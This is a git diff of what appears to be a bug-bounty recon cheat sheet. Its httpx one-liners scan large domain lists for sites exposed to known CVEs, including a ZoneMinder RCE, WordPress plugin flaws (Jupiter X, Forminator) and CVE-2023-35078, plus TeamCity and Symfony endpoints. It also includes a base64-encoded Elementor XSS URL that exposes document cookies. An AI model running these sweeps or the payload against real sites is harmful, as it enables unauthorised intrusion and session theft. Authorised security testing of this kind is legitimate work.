@@ -51,17 +51,25 @@
     cat subs.txt | httpx -path "/Telerik.Web.UI.WebResource.axd?type=rau" -ms '"RadAsyncUpload handler is registered succesfully' -t 200 -o telerik2.txt
     
 ## zoneminder_RCE CVE-2023-26035
-    cat alldomains.txt | httpx -path "/index.php" -ms "__csrf_magic" -t 200 -o CVE-2023-26035.txt
+    cat alldomains.txt | httpx -path "/index.php" -ms "name=__csrf_magic" -t 200 -o CVE-2023-26035.txt
 
 ## CVE-2023-38388
     cat privates/domainsroot.txt | httpx -path "/wp-content/plugins/jupiterx-core/readme.txt" -ms "Jupiter X Core" -o jupiter.txt
 
+## CVE-2023-4596
+    cat bugbounty/subs.txt | httpx -path '/wp-content/plugins/forminator/readme.txt' -ms  "Stable tag: 1." -o "forminator.txt"
+
 ## TeamCity
     cat alldomains.txt | httpx -path "/login.html" -ms "log in to teamcity" -o teamcity.txt
 
+## CVE-2023-35078
+    cat alldomains.txt | httpx -ms "ui.login.css?" -o CVE-2023-35078.txt
+
+    /wp-content/plugins/forminator/readme.txt
 ## Elementor Xss
     cat subs.txt | httpx -path "wp-content/plugins/elementor/readme.txt" -mr "(?i)Stable tag: (3\.[0-5]\.[0-5]\d*)" -o elementor.txt -t 200
     www.target.com/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbisnICcrZG9jdW1lbnQuY29va2llKSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
+    
 ## Symphonic
     cat subs.txt | httpx -path "_fragment" -ms 'Oops An Error Occurred' -o symphonic.txt -t 200
     
